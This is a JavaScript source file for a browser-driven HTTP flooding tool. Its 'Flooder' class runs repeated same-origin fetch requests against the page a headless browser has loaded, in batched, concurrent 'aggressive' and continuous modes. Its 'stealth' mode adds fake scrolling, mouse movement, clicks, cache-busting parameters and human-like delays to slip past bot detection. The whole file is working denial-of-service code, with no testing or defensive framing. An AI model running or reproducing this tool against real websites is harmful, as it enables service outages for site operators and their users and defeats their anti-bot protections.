import { log } from "../util/Util.js";
import { randnum } from "../util/Helpers.js";

export class Flooder {
  constructor(browserObject) {
    this.browserData = browserObject;
    Object.assign(this, browserObject);
  }

  async start(page) {
    log(
      "FLOODER",
      `Flooder instance ${this.browserId} starting flood with ${this.browserConfig.rps} requests`
    );

    await page.evaluate(() => {
      window.__floodStats = { success: 0, failed: 0, total: 0 };

      window.__sendRequest = async (index, method = "GET") => {
        const startTime = performance.now();
        try {
          const response = await fetch(window.location.href, {
            method: method,
            credentials: "include",
            cache: "no-cache",
            mode: "same-origin",
            redirect: "follow",
            headers: {
              "Cache-Control": "no-cache",
              Pragma: "no-cache",
            },
          });

          const duration = Math.round(performance.now() - startTime);
          window.__floodStats.total++;

          if (response.ok) {
            window.__floodStats.success++;
            return { success: true, status: response.status, duration, index };
          } else {
            window.__floodStats.failed++;
            return { success: false, status: response.status, duration, index };
          }
        } catch (error) {
          window.__floodStats.failed++;
          window.__floodStats.total++;
          return { success: false, error: error.message, index };
        }
      };
    });

    if (this.browserConfig.rps <= 20) {
      for (let i = 0; i < this.browserConfig.rps; i++) {
        const method = Math.random() > 0.9 ? "POST" : "GET";

        const result = await page.evaluate(
          async (idx, m) => await window.__sendRequest(idx, m),
          i,
          method
        );

        if (result.success) {
          log(
            "SUCCESS",
            `Browser ${this.browserId}: Request ${i + 1}/${
              this.browserConfig.rps
            } - ${result.status} (${result.duration}ms)`
          );
        } else {
          log(
            "WARN",
            `Browser ${this.browserId}: Request ${i + 1}/${
              this.browserConfig.rps
            } - ${result.status || "Failed"}`
          );
        }

        // Small random delay between requests to look more natural
        if (i < this.browserConfig.rps - 1) {
          await new Promise((r) => setTimeout(r, randnum(100, 300)));
        }
      }
    } else {
      const batchSize = 10;
      const batches = Math.ceil(this.browserConfig.rps / batchSize);

      for (let batch = 0; batch < batches; batch++) {
        const batchStart = batch * batchSize;
        const batchEnd = Math.min(
          batchStart + batchSize,
          this.browserConfig.rps
        );

        log(
          "FLOODER",
          `Browser ${this.browserId}: Sending batch ${
            batch + 1
          }/${batches} (requests ${batchStart + 1}-${batchEnd})`
        );

        await page.evaluate(
          async (start, end) => {
            const promises = [];
            for (let i = start; i < end; i++) {
              const method = Math.random() > 0.9 ? "POST" : "GET";
              promises.push(window.__sendRequest(i, method));
            }
            await Promise.allSettled(promises);
          },
          batchStart,
          batchEnd
        );

        if (batch < batches - 1) {
          await new Promise((r) => setTimeout(r, randnum(200, 500)));
        }
      }
    }
    const stats = await page.evaluate(() => window.__floodStats);

    log(
      "SUCCESS",
      `Browser ${this.browserId} flood complete: ${stats.success}/${stats.total} successful, ${stats.failed} failed`
    );

    return { success: true, stats, browserData: this.browserData };
  }

  async startStealth(page) {
    log(
      "FLOODER",
      `Browser ${this.browserId} starting STEALTH flood with ${this.browserConfig.rps} requests`
    );

    await page.evaluate(() => {
      window.__floodStats = { success: 0, failed: 0, total: 0 };

      // Simulate human-like behavior
      window.__humanLikeRequest = async (index) => {
        const startTime = performance.now();

        const actions = [
          async () => {
            const scrollAmount = Math.random() * 500;
            window.scrollBy(0, scrollAmount);
            await new Promise((r) => setTimeout(r, 100 + Math.random() * 200));
          },
          async () => {
            document.dispatchEvent(
              new MouseEvent("mousemove", {
                clientX: Math.random() * window.innerWidth,
                clientY: Math.random() * window.innerHeight,
              })
            );
            await new Promise((r) => setTimeout(r, 50 + Math.random() * 100));
          },
          async () => {
            const x = Math.random() * window.innerWidth;
            const y = Math.random() * window.innerHeight;
            document.dispatchEvent(
              new MouseEvent("click", {
                clientX: x,
                clientY: y,
                bubbles: true,
              })
            );
            await new Promise((r) => setTimeout(r, 100 + Math.random() * 300));
          },
        ];

        const numActions = Math.floor(Math.random() * 3);
        for (let i = 0; i < numActions; i++) {
          const action = actions[Math.floor(Math.random() * actions.length)];
          await action();
        }

        try {
          const methods = ["GET", "GET", "GET", "GET", "POST"];
          const method = methods[Math.floor(Math.random() * methods.length)];

          let url = window.location.href;
          if (Math.random() > 0.7) {
            const params = new URLSearchParams(window.location.search);
            params.set("_t", Date.now());
            url = window.location.pathname + "?" + params.toString();
          }

          const response = await fetch(url, {
            method: method,
            credentials: "include",
            cache: "default",
            mode: "same-origin",
            redirect: "follow",
            headers: {
              "X-Requested-With": "XMLHttpRequest",
            },
          });

          const duration = Math.round(performance.now() - startTime);
          window.__floodStats.total++;

          if (response.ok) {
            window.__floodStats.success++;
            return { success: true, status: response.status, duration, index };
          } else {
            window.__floodStats.failed++;
            return { success: false, status: response.status, duration, index };
          }
        } catch (error) {
          window.__floodStats.failed++;
          window.__floodStats.total++;
          return { success: false, error: error.message, index };
        }
      };
    });

    for (let i = 0; i < this.browserConfig.rps; i++) {
      const result = await page.evaluate(
        async (idx) => await window.__humanLikeRequest(idx),
        i
      );

      if (result.success) {
        log(
          "SUCCESS",
          `Browser ${this.browserId}: Stealth request ${i + 1}/${
            this.browserConfig.rps
          } - ${result.status} (${result.duration}ms)`
        );
      } else {
        log(
          "WARN",
          `Browser ${this.browserId}: Stealth request ${i + 1}/${
            this.browserConfig.rps
          } - ${result.status || "Failed"}`
        );
      }

      if (i < this.browserConfig.rps - 1) {
        const delay = randnum(1001, 10001);
        log(
          "INFO",
          `Browser ${this.browserId}: Waiting ${Math.round(
            delay / 1000
          )}s before next request (mimicking human behavior)`
        );
        await new Promise((r) => setTimeout(r, delay));
      }
    }

    const stats = await page.evaluate(() => window.__floodStats);

    log(
      "SUCCESS",
      `Browser ${this.browserId} stealth flood complete: ${stats.success}/${stats.total} successful, ${stats.failed} failed`
    );

    return { success: true, stats, browserData: this.browserData };
  }

  async startAggressive(page) {
    log(
      "FLOODER",
      `Browser ${this.browserId} starting AGGRESSIVE flood with ${this.browserConfig.rps} concurrent requests`
    );

    const results = await page.evaluate(async (rps) => {
      const requests = [];
      for (let i = 0; i < rps; i++) {
        const method = Math.random() > 0.9 ? "POST" : "GET";
        requests.push(
          fetch(window.location.href, {
            method: method,
            credentials: "include",
            cache: "no-cache",
            mode: "same-origin",
          })
            .then((r) => ({ success: true, status: r.status, index: i }))
            .catch((e) => ({ success: false, error: e.message, index: i }))
        );
      }

      return await Promise.allSettled(requests);
    }, this.browserConfig.rps);

    const successful = results.filter(
      (r) => r.status === "fulfilled" && r.value.success
    ).length;

    log(
      "SUCCESS",
      `Browser ${this.browserId} aggressive flood complete: ${successful}/${this.browserConfig.rps} successful`
    );

    return {
      success: true,
      stats: { success: successful, total: this.browserConfig.rps },
      browserData: this.browserData,
    };
  }

  async startContinuous(page, durationSeconds = 30) {
    log(
      "FLOODER",
      `Browser ${this.browserId} starting CONTINUOUS flood for ${durationSeconds}s`
    );

    await page.evaluate((duration) => {
      window.__stopFlooding = false;
      window.__floodStats = { success: 0, failed: 0, total: 0 };

      const flood = async () => {
        const endTime = Date.now() + duration * 1000;

        while (Date.now() < endTime && !window.__stopFlooding) {
          try {
            const response = await fetch(window.location.href, {
              method: "GET",
              credentials: "include",
              cache: "no-cache",
            });

            window.__floodStats.total++;
            if (response.ok) {
              window.__floodStats.success++;
            } else {
              window.__floodStats.failed++;
            }
          } catch (e) {
            window.__floodStats.failed++;
            window.__floodStats.total++;
          }
          await new Promise((r) => setTimeout(r, 50));
        }
      };

      flood();
    }, durationSeconds);

    const startTime = Date.now();
    const endTime = startTime + durationSeconds * 1000;

    while (Date.now() < endTime) {
      await new Promise((r) => setTimeout(r, 5000));

      const stats = await page.evaluate(() => window.__floodStats);
      const elapsed = Math.round((Date.now() - startTime) / 1000);
      const rps = Math.round(stats.total / elapsed);

      log(
        "INFO",
        `Browser ${this.browserId}: ${stats.total} requests sent (${rps} req/s) - ${stats.success} success, ${stats.failed} failed`
      );
    }

    await page.evaluate(() => {
      window.__stopFlooding = true;
    });
    await new Promise((r) => setTimeout(r, 1000));

    const finalStats = await page.evaluate(() => window.__floodStats);

    log(
      "SUCCESS",
      `Browser ${this.browserId} continuous flood complete: ${finalStats.success}/${finalStats.total} successful`
    );

    return { success: true, stats: finalStats, browserData: this.browserData };
  }
}
